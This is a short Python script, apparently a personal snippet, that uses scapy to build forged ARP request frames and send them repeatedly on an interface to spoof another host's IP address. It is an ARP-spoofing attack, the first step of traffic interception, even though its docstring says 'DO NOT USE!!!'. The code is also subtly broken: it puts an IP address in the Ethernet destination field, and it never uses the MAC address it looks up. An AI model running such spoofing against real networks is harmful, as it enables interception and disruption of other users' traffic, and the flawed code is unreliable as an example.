#!/usr/bin/env python
# coding: utf-8
#

''' import modules
'''

from scapy.all import *

def arp_spoofing(org_ip, spoof_ip, target, iface):
    ''' arp spoofing by scapy -> DO NOT USE!!!
    '''
    # target MAC addr
    dst_hwaddr = getmacbyip(org_ip)

    # generate a frame for arp spoofing
    frame = Ether(dst = org_ip) / ARP(op = 1, psrc = spoof_ip, pdst = target)
    # frame = ARP(hwsrc = dst_hwaddr, op = 1, psrc = gateway)
    ans, unans = srploop(frame, iface = iface)
